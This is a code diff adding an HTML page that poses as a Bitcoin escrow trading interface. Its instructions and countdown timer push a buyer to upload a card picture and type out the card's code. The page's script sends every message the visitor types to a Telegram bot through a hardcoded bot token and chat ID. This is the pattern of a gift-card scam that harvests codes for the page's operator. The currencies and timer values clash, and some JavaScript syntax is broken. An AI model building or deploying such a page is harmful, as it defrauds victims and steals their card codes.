@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>BTC Escrow Interface</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            background-color: #f2f2f2;
+        }
+        
+        .header {
+            background-color: #015c3e;
+            color: white;
+            padding: 10px 20px;
+            font-weight: bold;
+        }
+        
+        .header span {
+            float: right;
+        }
+        
+        .instructions-box {
+            background-color: #e6fff2;
+            padding: 20px;
+            border-radius: 5px;
+            margin: 20px;
+        }
+        
+        .instructions-box h4 {
+            margin-top: 0;
+        }
+        
+        .instructions-box ul {
+            padding-left: 20px;
+        }
+        
+        .button-container {
+            display: flex;
+            gap: 10px;
+            margin: 0 20px 20px;
+        }
+        
+        .button {
+            padding: 10px 20px;
+            background-color: #007547;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        
+        .button.cancel {
+            background-color: #dc3545;
+        }
+        
+        .chat-container {
+            background-color: white;
+            padding: 20px;
+            border-top: 1px solid #ccc;
+        }
+        
+        .chat-input {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        
+        .chat-input textarea {
+            width: 100%;
+            height: 100px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            resize: vertical;
+        }
+        
+        .chat-input button {
+            padding: 10px 15px;
+            border: none;
+            background-color: #007547;
+            color: white;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        
+        .status-paid {
+            background-color: #ffcc00;
+            padding: 10px 15px;
+            border-radius: 20px;
+            color: #000;
+            font-weight: bold;
+        }
+        
+        .timestamp {
+            color: red;
+            font-weight: bold;
+            min-width: 60px;
+        }
+        
+        .status-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .response {
+            margin-top: 10px;
+            padding: 10px;
+            background-color: #f1f1f1;
+            border-radius: 4px;
+            font-style: italic;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="header">
+        Buying <strong>0.00080512 BTC</strong> → <strong>200.00 HKD</strong>
+    </div>
+
+    <div class="instructions-box">
+        <p><strong>The buyer is paying KES 200 via M-PESA. BTC is now in escrow. The buyer has 30 minutes to pay.</strong></p>
+        <h4>📋 Follow these instructions:</h4>
+        <ul>
+            <li>Don't upload the card until requested.</li>
+            <li>Include clear receipt and card picture.</li>
+            <li>Type out the code after uploading the card.</li>
+            <li>Be patient; coins are released after verification.</li>
+        </ul>
+    </div>
+
+    <div class="button-container">
+        <button class="button">Start Escrow</button>
+        <button class="button cancel">Cancel Escrow</button>
+    </div>
+
+    <div class="chat-container">
+        <div class="chat-input">
+            <textarea id="messageInput" placeholder="Type your message..."></textarea>
+            <div class="status-group">
+                <div class="status-paid">💰 Paid</div>
+                <button onclick="sendMessage()">Send</button>
+                <span class="timestamp" id="countdownTimer">20:00</span>
+            </div>
+            <div class="response" id="botResponse"></div>
+        </div>
+    </div>
+
+    <script>
+        let timeLeft = 20 * 60; // 20 minutes in seconds
+        const timerDisplay = document.getElementById('countdownTimer');
+
+        function updateTimer() {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            timerDisplay.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+            if (timeLeft > 0) {
+                timeLeft--;
+                setTimeout(updateTimer, 1000);
+            }
+        }
+
+        updateTimer();
+
+        async function sendMessage() {
+            const message = document.getElementById('messageInput').value;
+            const botResponse = document.getElementById('botResponse');
+
+            if (!message) return;
+
+            const BOT_TOKEN = '7749131850:AAEk_xy6kYLQPqen-rTI52ZUk5gPq1f6mDo';
+            const CHAT_ID = '5615316142';
+
+            const sendUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            await fetch(sendUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            });
+
+            botResponse.innerText = 'Message sent! Awaiting reply...';
+
+            setTimeout(async() => {
+                const updatesUrl = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`;
+                const res = await fetch(updatesUrl);
+                const data = await res.json();
+                const lastMsg = data.result ? .slice(-1)[0] ? .message ? .text;
+
+                if (lastMsg) {
+                    botResponse.innerText = 'Bot: ' + lastMsg;
+                } else {
+                    botResponse.innerText = 'Bot did not reply.';
+                }
+            }, 3000);
+        }
+    </script>
+</body>
+
+</html>
